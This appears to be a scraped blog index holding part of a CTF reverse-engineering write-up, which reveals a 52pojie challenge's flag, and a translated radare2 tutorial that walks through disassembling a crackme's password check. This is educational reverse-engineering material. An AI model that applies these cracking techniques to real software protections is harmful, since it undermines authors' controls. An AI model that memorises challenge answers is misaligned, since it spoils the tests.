ƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc\"); 1234567891011#!/usr/bin/env pythonf = open('plain_array.txt', 'rb')t = f.read()f.close()data = t.split('\\n')[:-1]print len(data)# print dataf = open('trial.7z', 'wb')for i in range(len(data)): f.write(chr(int(data[i])))f.close() 解压后拿到一个新文件nb，还是被加密了的： 1ȐȼŃƁȓĉnƅŕƇŅƀȓƇŃƅȒċƝþŕƇNƄɌćŃÞɌCȵBȒČNƄɌCňƀɌćÑbȒCŅÞŕƇŇƁȓƇńƁŕƇŅƅȒCņbȒċƝÞȒƈƝƀȒČnƁɌćŃÞȓƈȠƅȓƇNþɌcńBȓĊǸƁȒȼȵbȒƈnbɌCȵßȒȼȠÞȓĉNƁŗćƝƅRćŇbƞƅRȻÑßŘȻŇƁrĊńßŕčȠþRĉNƁƦĈņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƅŔĆņÞrȼȒćƝþǸßRĊńþrȻNþrČńßŕčǸÞRĊȵÞrȼȵbŕƇŇÞrĊnÞŔĆnBŘÇƝƃrĉǹþƦćņƅƦcȵƀƦćņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƃŔĆǸþRĊƝƃrĉňÞƦĉřƇƞþȵƅrȼņbrCnƃŔĆņßRćńßrȻńßŕčŃBRĊƞƅřȻƞƀřƇǹþƦćȵÞřƈƞþřȻŅþƦcǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻņƁƦcǹþƦćņƄƦcƞƄřȻņBƦcǹÞƦćŃbƦĈȵƀƦćȒćƝÞŃƄŔCƞÞřȻŅþƦcňÞƦĉřƇƞþȵƅrȼņbrCŃƄŔCƞßřȻŅÞƦcǹÞƦćȵƄřƈȵƀƦćŅÞƦcňÞƦĉȵƁřƈŅßřƇȒćƝþŃBRĊƞßřȻņƀƦcňÞƦĉȵƄřƈƞÞřȻņƀƦcǹÞƦćNþƦĈƞƅřȻņƀƦcňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞƄřȻȒćƝÞnƃŔĆǸþRĊŇƅrĊŃBrČŃƃŔċńþrȻŅbrċǹÞƦćȵÞřƈȓčnÞnƅrćǸƃŔćÑþŘȻȠBŘĊȵƅŕċRćņßƝƃŔƇȵƅrƇŅÞƦcǹÞƦćȵƁřƈȓčnƄNþřĆŃƃŔċÑƀrÇƞƀřƇǹþƦćņƄƦcƞƅřȻņƁƦcňÞƦĉņƄƦcňßƦcņƀƦcǸßřȻȵƃřƈňßƦcŇBřƇǸƄřȻņƄƦcȵƀƦćȒćƝÞǸbŔćňÞRČNƅŘCǹÞƦćŃbƦĈňÞƦcƞƀřƇǸƄřȻȒĉŅBǹÞrčȠbrčŅÞŔcÑƃRCȵbŕƇnƅrćŃƄŔCƞßřȻŅÞƦcňÞƦĉȵƁřƈƞƄřȻŇbřƇňÞƦĉȵƁřƈŅßřƇŇBřƇǸƁřȻņƄƦcƞßřȻƞƀřƇǹþƦćȵÞřƈÑbřȻřČȵßǸÞRĊǸþRĊǹÞrčȠbrčǸbŔćņþRćȠƃŘĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƁřȻņƄƦcƞƅřȻƞƀřƇǹÞƦćȵƀřƈNƁƦĈƞƀřƇňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞƄřȻņBƦcǸßřȻȵþřƈȵƀƦćȒćƝƄȵƅŔȻNƅRĉǸƅŘCņbrCȠBŔĆŅßřƇřČȵƁȵƅŔȻńþrȻƝƃrĉǸƃřȻȵÞřƈNƁƦĈņBƦcňÞƦĉȵƁřƈŇbƦĆŅÞƦcǹþƦćņƅƦcȵƀƦćŇBřƇǸƅřȻȵþřƈƞßřȻņƀƦcǸƄřȻȵƄřƈȵƀƦćņƀƦcǹÞƦćŃbƦĈNƁƦĈņƁƦcǹÞƦćNþƦĈƞßřȻřČȵƅnƃŔĆƝƃrƈǹƀŕĉŇÞrĊnƃŔĆȵƁrȼņbŔcŃƃrČǸbŔćņßRćÑƀrƇǸßřȻņƄƦcƦȼŇƅnßrćǹbRĊŅbrȻǹÞŕĊňÞƦĉřƇÑbǸþŕĉńƅŕčƞƀRȻÑBRCƝBrƈŃbřĆŃÞŖĊnƀŘÇǹƀŕĉŇƄrĊƝƃŔƇȵƄrȼŃƀrČņBrCȠþRĉňßƦcřċÑƅRĆŇþŖƇŃÞǹƅƦćȒĉŅBȵƁrȼňßŕċȠßŔčƞßřȻņƁƦcǹÞƦćřƇƞþǹÞrčņbrCnƃŔĆÑƃRCȵbŕƇņbrCnÞŔĆnBŘÇŇƅrĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƃřȻȵßřƈƞßřȻƞƀřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻƞƀřƇǹÞƦćȵÞřƈƞƄřȻŇBřƇǸƅřȻȵþřƈƞƅřȻȒćƝƅŃÞŖĊnBŘÇŅbrȻȠBrčǸÞRĊǸßRĊŅßŔcŃƁřĆǹbRĊȵßrȼƞbŘČŇþrĊǸÞRĊÑBRCǹƄrčńƅŕčŃƄŔCƞßřȻņƁƦcǹÞƦćȵÞřƈȓČŃƅƝƅƦcNþƦĈňßƦcņBƦcǹßƦćńßřƇňßƦcņƀƦcǸƅřȻřčȠbŅþƦcǹƅƦćȵƄřƈƞÞřȻƞƀřƇ 然后一层层解密拿到 key： 1234567Well done! It seems that you have great programming skills.ȐȼŃßɌCȵƃȒȼȵbȒƈnbɌÇńßɌĈȠƃȒȻŃBȓƈȠƃȒȼȵbȒČŃBɌCňƀȒĊŇßɌcńþȓČŇƁŕƇņÞȒȻŃƄŕƇŅƅȓƇŃƃȒȼȠbȒCņƁɌCňƀȒCŅƀȒĉȠƀɌćÑbɌcŅƄɌĉņƄȒȻńƄɌĉŇÞŕƇņÞȒȻŃƄŕƇŃbȒČŃƄŕƇńBȒČnƁȓȼǸßŗĆnƀȒćnþŕƇnþȓƇńƅɌƇƝƄřĈƝßŗƇȠbȓčȵbȒȼƞþŗcŅƅȑĉȠƁȒCŅƀɌćŃÞɌćÑßŕƇŅþȓČňBɌČŅƅȓĊǸƄɌcńƄŕƇńþȒĆȵþɌĉŇÞŕƇŃƃřčȠbřċȵƀȓCÑBřćŃBŖČȵƃɌćǸƀȓƈȠßŘčŅƄŗĉȠƄȒȼȵƅȒȻŅBȒĆƝƃȒĈÑƄȓĊņBřƇNƁɌƇƞbɌCƝßȐĉņþƦȻƝƃŗĈńƀɌCƝB;) ȐcňÞŗcŅƅȒCŅƀȒĉȠƀȒȻŃƄɌcńƄŖċŅþŕƇņÞȒȻŃƄŕƇŅþȒČŃßŘčńbƦȻŇƅɌČÑþɌƈǹƃɌĉŅßȒCŅƅȒČnBƦȻƝƃȑÇƝƄŘCNƁȐĉņþ 1234567Well done! It seems that you have great programming skills.Wishing you happiness during the holidays and throughout the New Year!- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js);) Oh, and here&apos;s the key: N0w_y0u_are_NB_A5_RC 感谢的话最后感谢吾爱破解大佬们的辛勤付出！ 参考网站https://github.com/Coxxs/RCNB.jshttps://travis-ci.com/Coxxs/RCNB.jshttps://liudanking.com/golang/utf-8_replacement_character/https://www.52pojie.cn/thread-873265-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"【转】Installing Minimal Ubuntu for REMnux","slug":"【转】Installing-Minimal-Ubuntu-for-REMnux","date":"2019-02-20T14:10:38.000Z","updated":"2019-08-26T01:14:27.402Z","comments":true,"path":"2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/","link":"","permalink":"blog.b3ale.cn/2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/","excerpt":"因为 google drive 上下载 REMnux 的 ova 实在是太慢了，在官方文档上看到了可以用 ubuntu 来弄。这里记录一下安装Ubuntu 14.04 64-bit minimal ISO的过程。搬运自这里。","text":"因为 google drive 上下载 REMnux 的 ova 实在是太慢了，在官方文档上看到了可以用 ubuntu 来弄。这里记录一下安装Ubuntu 14.04 64-bit minimal ISO的过程。搬运自这里。","categories":[],"tags":[{"name":"repost","slug":"repost","permalink":"blog.b3ale.cn/tags/repost/"}]},{"title":"【译】Radare2之旅-Part1：Simple crackme","slug":"【译】Radare2之旅-Part1：Simple-crackme","date":"2019-02-18T04:17:27.000Z","updated":"2019-08-26T01:13:50.215Z","comments":true,"path":"2019/02/18/【译】Radare2之旅-Part1：Simple-crackme/","link":"","permalink":"blog.b3ale.cn/2019/02/18/【译】Radare2之旅-Part1：Simple-crackme/","excerpt":"翻译自Megabeets。","text":"翻译自Megabeets。 序言过去一年里的 CTF 比赛中，不论是逆向工程（RE）还是漏洞挖掘（PWN），我一直在用radare2。我发现radare2对于很多 CTF 的题目来说都很有用，极大地缩短了我的做题时间。遗憾的是熟悉 radare2 的人太少了。可能大家都习惯了使用IDA Pro、OllyDBG还有gdb，或者没有听说过它。不管怎么样，我都认为radare2应该成为你工具箱中的一部分。 因为我真的特别喜欢这个项目，而且我希望能有越来越多的人开始熟悉它、使用它，能对项目做出一些贡献。我计划写一系列的文章以及使用r2的例子。因为那些文章都涉及radare2的特点和功能，我会解释的更加详细。 radare2radare2是一个逆向工程和二进制分析的开源框架，它有很多命令行接口，包括反汇编、分析数据、打补丁、比较数据、查找、替换、可视化等等功能。同时它可以在几乎所有的主要操作系统（GNU/Linux、.Windows、*BSD、iOS、OSX、Solaris等等）上运行，并且支持许多 CPU 架构和文件格式。他所有的特点可以展现出一个思想——radare2是绝对自由的。 该框架是一个工具的集合，既可以在r2给出的 shell 下使用，又可以独立使用——比如我们将要了解的rahash2、rabin2、ragg2三个组件。所有的组件赋予了radare2强大的静态或动态分析、十六进制编辑以及漏洞挖掘能力（在接下来的文章中我会更深入地讲述）。 我们必须意识到学习r2是一个十分艰难的过程——虽然r2有 GUI 和 WebUI。在我看来，IDA 的 GUI 和方便性确实更佳。但是它的命令行接口，包括其可视化模式，仍然是radare2的核心以及魅力所在。因为它的复杂性，我会尽力讲得浅显易懂。 在开始之前，你可以看一看“r2、IDA Pro 和 Hopper 等工具间的比较”来了解它。 获取radare2下载radare2的环境配置非常快——我们每天都会更新，所以更推荐你去使用 git 的版本，而不是稳定版本。有时候稳定版本可能没有 git 版本更稳定。 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 如果你不想下载 git 版本或者你想要不同操作系统（Windows、OS X、iOS等等）上的可执行文件，可以在radare2 官网下载界面查看。 更新正如我之前所说的，更推荐大家使用 git 仓库里最新版的r2。从 git 更新r2只需要执行： 1$ ./sys/install.sh 然后你就能从 git 获得最新的版本。我通常每天早上会更新一下radare2，在这期间可以看看一会儿视频消遣。 卸载我实在想不出什么理由会让你在看这篇文章时想要卸载radare2。如果要卸载的话只需要执行： 12$ make uninstall$ make purge 开始学习你可以在这里下载 Crackme。 现在你已经在自己的系统上下载了radare2和文件，我们可以开始探索radare2的基础使用。我会在REMunx上调试，大部分的命令和说明跟Windows或者其他系统上是一样的。 命令行参数和大部分命令行工具一样，查看可选参数的方式是执行-h参数： 1$ r2 -h 我不把完整的输出放上来，而是放一些我日常工作中常用的参数： 12345678910111213Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file] [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=-d: Debug the executable 'file' or running process 'pid'-A: Analyze executable at load time (xrefs, etc)-q: Quiet mode, exit after processing commands-w: Write mode enabled-L: List of supported IO plugins-i [file]: Interprets a r2 script-n: Bare load. Do not load executable info as the entrypoint-c 'command; command; ...': Run r2 and execute commands (eg: r2 's main; px 60')-p [prj]: Creates a project for the file being analyzed-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with 二进制信息面对一个新的文件时，我第一件想做的事就是获取文件的信息。我们可以使用r2框架中最强大的工具之一——rabin2来获取信息。 rabin2可以从二进制文件中获取信息，包括区段、文件头、导入导出表、字符串、入口点等等。同时具有不同的格式的输出。rabin2支持ELF、PE、Mach-O、Java CLASS等文件。 使用man rabin2查看更多的信息。 我们执行rabin2并使用参数-I输出二进制信息，例如操作系统、语言、字节序、框架以及保护技术（比如Canary、PIC、NX）等等。 123456789101112131415161718192021222324252627$ rabin2 -I megabeets_0x1havecode truepic falsecanary falsenx falsecrypto falseva trueintrp /lib/ld-linux.so.2bintype elfclass ELF32lang carch x86bits 32machine Intel 80386os linuxminopsz 1maxopsz 16pcalign 0subsys linuxendian littlestripped falsestatic falselinenum truelsyms truerelocs truerpath NONEbinsz 6220 你可以清楚地看到，这是一个 32 位 elf 文件，没有符号表并且是动态链接。它没有任何漏洞利用技术——下一篇文章我们讲学习使用radare2来对漏洞进行利用。让我们跑一下程序，看看它做了什么。 注意：虽然我可以向你保证这个程序是安全的，但是逆向一个未知的程序时，务必在一个虚拟环境下运行。 不过你可以相信我，因为程序确实是安全的。😛 1234567891011$ ./megabeets_0x1 .:: Megabeets ::.Think you can make it?Nop, Wrong argument.$ ./megabeets_0x1 abcdef .:: Megabeets ::.Think you can make it?Nop, Wrong argument. 第一次跑的时候，输出了Nop, Wrong argument。假设我们需要提供一个参数，第二次输入abcdef作为参数，依旧失败了。显然需要特定的字符串才能绕过。 让我们用radare2来测试程序： 123$ r2 ./megabeets_0x1 — Thank you for using radare2. Have a nice night![0x08048370]&gt; 我们生成了一个radare2的 shell，还有一个欢迎界面。我们可以执行fo来输出一个新的句子，有些很搞笑同时有些也很有趣。现在r2的 shell 正在等着我们输入命令，并且展示给我们此刻所在的地址（0x08048370）。默认情况下我们自动在入口点处。让我们看看是否正确： 123[0x08048370]&gt; ie[Entrypoints]vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints 我们使用ie命令输出了文件的入口点地址。r2命令有一系列有意义的字母。在这个例子里，ie代表了info &gt;&gt; entrypoint。因此在你熟悉了radare2的能力之后，命令都是比较好记的。但是你不需要记住所有的命令——你可以仅仅需要在（几乎）每个字母后面加上?来获得命令的信息以及它的子命令。 12345678910111213141516171819202122232425262728293031323334[0x08048370]&gt; i?|Usage: i Get info from opened file (see rabin2’s manpage)| Output mode:| ‘*’ Output in radare commands| ‘j’ Output in json| ‘q’ Simple quiet output| Actions:| i|ij Show info of current file (in JSON)| iA List archs| ia Show all info (imports, exports, sections..)| ib Reload the current buffer for setting of the bin (use once only)| ic List classes, methods and fields| iC Show signature info (entitlements, …)| id Debug information (source lines)| iD lang sym demangle symbolname for given language| ie Entrypoint| iE Exports (global symbols)| ih Headers (alias for iH)| iHH Verbose Headers in raw text| ii Imports| iI Binary info| ik [query] Key-value database from RBinObject| il Libraries| iL List all RBin plugins loaded| im Show info about predefined memory allocation| iM Show main address| io [file] Load info from file (or last opened) use bin.baddr| ir|iR Relocs| is Symbols| iS [entropy,sha1] Sections (choose which hash algorithm to use)| iV Display file version info| iz Strings in data sections| izz Search for Strings in the whole binary| iZ Guess size of binary program i命令目的是从打开的文件中获取信息，它就是集成到radare2的 shell 里的rabin2（之前提到的）。 分析默认情况下radare2不会自动分析文件，因为分析文件是一个复杂的过程，尤其是比较大的文件。了解更多关于分析的内容，你可以看一看在radare2博客上的这篇文章。 显然分析仍然是可能的，r2提供了许多种类的分析方式。正如我之前提到的，我们可以通过对a命令后面添加?来查找分析选项。 1234567891011121314151617181920212223242526[0x08048370]&gt; a?|Usage: a[abdefFghoprxstc] […]| ab [hexpairs] analyze bytes| abb [len] analyze N basic blocks in [len] (section.size by default)| aa[?] analyze all (fcns + bbs) (aa0 to avoid sub renaming)| ac[?] [cycles] analyze which op could be executed in [cycles]| ad[?] analyze data trampoline (wip)| ad [from] [to] analyze data pointers to (from-to)| ae[?] [expr] analyze opcode eval expression (see ao)| af[?] analyze Functions| aF same as above, but using anal.depth=1| ag[?] [options] output Graphviz code| ah[?] analysis hints (force opcode size, …)| ai [addr] address information (show perms, stack, heap, …)| ao[?] [len] analyze Opcodes (or emulate it)| aO Analyze N instructions in M bytes| ar[?] like ‘dr’ but for the esil vm. (registers)| ap find prelude for current offset| ax[?] manage refs/xrefs (see also afx?)| as[?] [num] analyze syscall using dbg.reg| at[?] [.] analyze execution tracesExamples:f ts @ S*~text:0[3]; f t @ section..textf ds @ S*~data:0[3]; f d @ section..data.ad t t+ts @ d:ds 我通常开始分析时会执行aa（analyse all）。这个名称有一点容易误解，因为除此之外还有很多可以分析的（执行aa?可以看到更多的用法），但对于这个程序来说已经足够了。这次我们直接执行aaa，更简单些。你也可以执行radare2用-A参数来分析文件，直接在开始就执行aaa（例如r2 -A megabeets_0x1） 123456[0x08048370]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[*] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions (aan) 标志在分析之后，radare2把一些特定的名字和偏移联系在一起，例如区段、函数、符号表、字符串等等。他们被称作为标志。标志被整合进标志空间，一个标志空间是所有类似特征的标志的集合。执行fs以查看所有的标志： 1234567[0x08048370]&gt; fs0 4 . strings1 35 . symbols2 82 . sections3 5 . relocs4 5 . imports5 1 . functions 我们可以使用fs &lt;flagspace&gt;来查看某个特定的标志空间，然后用f输出所有的标志。我们使用分号将一行中的多个命令分开（比如命令一; 命令二; 命令三;...）。 123456[0x08048370]&gt; fs imports; f0x08048320 6 sym.imp.strcmp0x08048330 6 sym.imp.strcpy0x08048340 6 sym.imp.puts0xffffffff 16 loc.imp.__gmon_start__0x08048350 6 sym.imp.__libc_start_main 正如我们所看到的，radare2将所有程序所使用的导入表输出——可以看到我们所熟悉的strcmp、strcpy、puts等，包括相关的地址。我们也可以列出字符串的标志空间。 12345[0x08048370]&gt; fs strings; f0x08048700 21 str._n__.::_Megabeets_::.0x08048715 23 str.Think_you_can_make_it_0x0804872c 10 str.Success__n0x08048736 22 str.Nop__Wrong_argument._n 字符串我们看到r2列出了一些字符串的偏移，还有一些变量名。让我们主要来看看字符串。有很多可以列出程序中字符串的方式，你可以选择你最需要的一种。iz – 列出在数据短的字符串izz – 在整个程序中查找字符串 12345[0x08048370]&gt; izvaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\\n .:: Megabeets ::.vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\\nvaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\\n 我们已经熟悉了大部分字符串——还记得我们一开始运行程序时的那几行字符串吧。但是我们没有看到Success，这应该是我们输入正确字符串后的提示。既然我们已经得到了字符串，让我们看看它们在程序的什么地方被使用了。 12345[0x08048370]&gt; axt @@ str.*data 0x8048609 push str._n__.::_Megabeets_::. in maindata 0x8048619 push str.Think_you_can_make_it_ in maindata 0x8048646 push str._n_tSuccess__n in maindata 0x8048658 push str._n_tNop__Wrong_argument._n in main 这个命令展示给我们radare2更多的特点。axt命令用来在数据段或程序段交叉查找某个地址（试试ax?）。@@是一个迭代器标志，用来在一段偏移上重复某个命令（试试@@?）。str.*是一个对所有开头为str.的标志的通配。这条命令能帮助我列出字符串标志以及对应所在的函数名。在这之前要确保选择了字符串的标志空间（默认时是fs *）。 定位正如我之前所说的，之前我们一直在程序的入口点，现在应该去其他地方看看了。我们刚列出来的字符串都是在main函数中的。为了定位到字符串，我们需要使用seek命令，用s替代。正如大家所知道的，在（几乎）每个命令后加上?会解决你所有的问题。 123456789101112131415161718192021222324[0x08048370]&gt; s?|Usage: s # Seek commands| s Print current address| s addr Seek to address| s- Undo seek| s- n Seek n bytes backward| s– Seek blocksize bytes backward| s+ Redo seek| s+ n Seek n bytes forward| s++ Seek blocksize bytes forward| s[j*=] List undo seek history (JSON, =list, *r2)| s/ DATA Search for next occurrence of ‘DATA’| s/x 9091 Search for next occurrence of \\x90\\x91| s.hexoff Seek honoring a base from core-&gt;offset| sa [[+-]a] [asz] Seek asz (or bsize) aligned to addr| sb Seek aligned to bb start| sC[?] string Seek to comment matching given string| sf Seek to next function (f-&gt;addr+f-&gt;size)| sf function Seek to address of specified function| sg/sG Seek begin (sg) or end (sG) of section or file| sl[?] [+-]line Seek to line| sn/sp Seek next/prev scr.nkey| so [N] Seek to N next opcode(s)| sr pc Seek to register seek命令是接收一个地址或是一个数学表达式作为参数。这个表达式可以是数学运算、标志或者内存访问操作。我们可以执行s main来定位到 main 函数。让我们先通过afl命令（Analyze Functions List）来查看radare2为我们列出了哪些函数。 12345678910111213141516171819[0x08048370]&gt; afl0x080482ec 3 35 sym._init0x08048320 1 6 sym.imp.strcmp0x08048330 1 6 sym.imp.strcpy0x08048340 1 6 sym.imp.puts0x08048350 1 6 sym.imp.__libc_start_main0x08048360 1 6 sub.__gmon_start___252_3600x08048370 1 33 entry00x080483a0 1 4 sym.__x86.get_pc_thunk.bx0x080483b0 4 43 sym.deregister_tm_clones0x080483e0 4 53 sym.register_tm_clones0x08048420 3 30 sym.__do_global_dtors_aux0x08048440 4 43 -&gt; 40 sym.frame_dummy0x0804846b 19 282 sym.rot130x08048585 1 112 sym.beet0x080485f5 5 127 main0x08048680 4 93 sym.__libc_csu_init0x080486e0 1 2 sym.__libc_csu_fini0x080486e4 1 20 sym._fini 这些导入函数正是我们之前所看到的，包括入口点、libc、main 函数和两个引人注意的函数分别叫做sym.beet和sym.rot13。 反汇编main 函数是时候去看看汇编代码了。首先我们用s main来定位到 main 函数，然后用pdf命令（Print Disassemble Function）来反汇编。注意地址是怎么准确地变成 main 函数的地址的。 注意：正如我之前所说的，这篇文章的目的是教大家学习和了解radare2，而不是教汇编语言的。因此我不会彻底地解释代码。实际上，这个程序也很简单，你只要有一点点基础的逆向工程知识就能掌握。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[0x08048370]&gt; s main[0x080485f5]&gt; pdf ;– main:/ (fcn) main 127| main ();| ; var int local_8h @ ebp-0x8| ; var int local_4h @ esp+0x4| ; DATA XREF from 0x08048387 (entry0)| 0x080485f5 8d4c2404 lea ecx, [esp + local_4h] ; 0x4| 0x080485f9 83e4f0 and esp, 0xfffffff0| 0x080485fc ff71fc push dword [ecx – 4]| 0x080485ff 55 push ebp| 0x08048600 89e5 mov ebp, esp| 0x08048602 53 push ebx| 0x08048603 51 push ecx| 0x08048604 89cb mov ebx, ecx| 0x08048606 83ec0c sub esp, 0xc| 0x08048609 6800870408 push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.| 0x0804860e e82dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048613 83c410 add esp, 0x10| 0x08048616 83ec0c sub esp, 0xc| 0x08048619 6815870408 push str.Think_you_can_make_it_ ; “Think you can make it?” @ 0x8048715| 0x0804861e e81dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048623 83c410 add esp, 0x10| 0x08048626 833b01 cmp dword [ebx], 1 ; [0x1:4]=0x1464c45| ,=&lt; 0x08048629 7e2a jle 0x8048655| | 0x0804862b 8b4304 mov eax, dword [ebx + 4] ; [0x4:4]=0x10101| | 0x0804862e 83c004 add eax, 4| | 0x08048631 8b00 mov eax, dword [eax]| | 0x08048633 83ec0c sub esp, 0xc| | 0x08048636 50 push eax| | 0x08048637 e849ffffff call sym.beet| | 0x0804863c 83c410 add esp, 0x10| | 0x0804863f 85c0 test eax, eax| ,==&lt; 0x08048641 7412 je 0x8048655| || 0x08048643 83ec0c sub esp, 0xc| || 0x08048646 682c870408 push str.Success__n ; “Success!.” @ 0x804872c| || 0x0804864b e8f0fcffff call sym.imp.puts ; int puts(const char *s)| || 0x08048650 83c410 add esp, 0x10| ,===&lt; 0x08048653 eb10 jmp 